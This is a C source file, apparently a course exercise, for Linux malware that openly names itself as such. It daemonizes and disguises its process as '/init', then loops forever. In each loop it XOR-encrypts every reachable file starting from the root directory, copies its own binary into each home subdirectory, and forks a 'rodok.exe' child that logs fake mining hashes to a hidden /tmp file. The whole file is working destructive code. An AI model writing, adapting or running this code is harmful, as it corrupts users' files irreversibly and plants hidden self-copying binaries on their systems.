#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>

#define MIN_MINER 3
#define MAX_MINER 10

int running = 1;
char *malware_name = "/init";
char *miner_log_path = "/tmp/.miner.log";
time_t xor_key;

// =================== UTILITY ====================
void daemonize() {
    pid_t pid = fork();

    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Exit parent

    umask(0);
    setsid();

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Exit first child

    chdir("/");

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) close(x);

    // rename process to /init
    prctl(PR_SET_NAME, malware_name, 0, 0, 0);
}

// =================== ENCRYPTOR ====================
void xor_encrypt_file(const char *path, time_t key) {
    FILE *f = fopen(path, "rb+");
    if (!f) return;

    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    rewind(f);

    for (long i = 0; i < size; i++) {
        int c = fgetc(f);
        fseek(f, -1, SEEK_CUR);
        fputc(c ^ key, f);
    }

    fclose(f);
}

void encrypt_dir_recursive(const char *path, time_t key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;

        char fullpath[PATH_MAX];
        snprintf(fullpath, PATH_MAX, "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                encrypt_dir_recursive(fullpath, key);
            } else if (S_ISREG(st.st_mode)) {
                xor_encrypt_file(fullpath, key);
            }
        }
    }

    closedir(dir);
}

// =================== TROJAN WRM ====================
void spread_malware(const char *binary_path) {
    const char *home = getenv("HOME");
    if (!home) return;

    DIR *dir = opendir(home);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR || !strcmp(entry->d_name, ".") || !strcmp(entry->d_name, ".."))
            continue;

        char target_path[PATH_MAX];
        snprintf(target_path, PATH_MAX, "%s/%s/%s", home, entry->d_name, "init");
        FILE *src = fopen(binary_path, "rb");
        FILE *dst = fopen(target_path, "wb");

        if (src && dst) {
            char buf[4096];
            size_t n;
            while ((n = fread(buf, 1, sizeof(buf), src)) > 0) {
                fwrite(buf, 1, n, dst);
            }
        }

        if (src) fclose(src);
        if (dst) fclose(dst);
    }

    closedir(dir);
}

// =================== RODOK.EXE ====================
void *miner_thread(void *arg) {
    int id = *((int *)arg);
    char hash[65];
    char logline[256];
    FILE *log;

    srand(time(NULL) + id);

    while (running) {
        for (int i = 0; i < 64; i++) {
            int val = rand() % 16;
            hash[i] = (val < 10) ? ('0' + val) : ('a' + val - 10);
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        strftime(logline, sizeof(logline), "[%Y-%m-%d %H:%M:%S]", tm_info);
        snprintf(logline + strlen(logline), sizeof(logline) - strlen(logline), "[Miner %02d] %s\n", id, hash);

        log = fopen(miner_log_path, "a");
        if (log) {
            fputs(logline, log);
            fclose(log);
        }

        sleep((rand() % 28) + 3);
    }

    return NULL;
}

void start_mining(int num_miners) {
    pthread_t miners[num_miners];
    int ids[num_miners];

    for (int i = 0; i < num_miners; i++) {
        ids[i] = i;
        pthread_create(&miners[i], NULL, miner_thread, &ids[i]);
    }

    for (int i = 0; i < num_miners; i++) {
        pthread_join(miners[i], NULL);
    }
}

// =================== MAIN LOOP ====================
int main(int argc, char *argv[]) {
    xor_key = time(NULL);

    daemonize();

    while (running) {
        // 1. Encrypt current directory
        encrypt_dir_recursive(".", xor_key);

        // 2. Spread malware
        spread_malware(argv[0]);

        // 3. Start rodok fork bomb
        pid_t rodok = fork();
        if (rodok == 0) {
            prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

            int miners = MIN_MINER;
            start_mining(miners);
            exit(0);
        }

        // Cleanup rodok if needed
        sleep(30);
        kill(rodok, SIGTERM);
        waitpid(rodok, NULL, 0);
    }

    return 0;
}
